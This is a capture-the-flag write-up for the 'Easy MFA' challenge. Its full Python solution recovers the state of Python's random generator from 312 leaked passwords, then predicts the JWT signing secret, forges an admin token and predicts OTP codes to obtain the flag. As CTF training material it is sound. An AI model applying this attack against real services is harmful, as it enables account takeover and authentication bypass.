# Easy MFA

Python random is vulnerable for predicting the random state based on randomly generated samples. The secret keys is generated, then passwords, all using `getrandbits`. We can get all the passwords and restore secret key using [this implementation](https://github.com/tna0y/Python-random-module-cracker/blob/master/randcrack/randcrack.py) I found by inputing 312 passwords and getting back with the offset to place where the secret key was generated. Then simply predict the secret key, create admin's token with it, get last OTP code, predict OTP codes until we find the matching one, then we can be sure that the next one will be the correct one. Entire solution:
```py
import requests
import base64
from randcrack import RandCrack
from flask_jwt_extended import JWTManager, create_access_token
from flask import Flask

rc = RandCrack()

URL = "https://easymfa.ecsc25.hack.cert.pl"

s = requests.Session()

passwords = []
token = None

for _ in range(312):
    headers = {}

    if token:
        headers['Authorization'] = f'Bearer {token}'

    res = s.get(f"{URL}/generate", headers=headers).json()

    passwords.append(res["password"])
    token = res["token"]

for p in passwords:
    p = base64.b64decode(p)
    rc.submit(int.from_bytes(p[4:]))
    rc.submit(int.from_bytes(p[:4]))

rc.offset(-312 * 2 - 8)
secret = rc.predict_getrandbits(32 * 8).to_bytes(32, 'big')

last_otp = s.post(f"{URL}/flag", headers={
    "Authorization": f"Bearer {token}",
}).text.split()[-1].split('</p>')[0]

while True:
    otp_try = base64.b64encode(rc.predict_getrandbits(
        8 * 8).to_bytes(8, 'big')).decode()
    if otp_try == last_otp:
        break

app = Flask(__name__)
app.config["JWT_SECRET_KEY"] = secret
jwt = JWTManager(app)
with app.test_request_context():
    token = create_access_token(identity="admin")

otp = base64.b64encode(rc.predict_getrandbits(
    8 * 8).to_bytes(8, 'big')).decode()

res = s.post(
    f"{URL}/flag",
    headers={
        "Authorization": f"Bearer {token}"
    },
    json={"OTP": otp}
).json()

print(res['flag'].strip())
# ecsc25{that_w4s_s0_rand0m}
```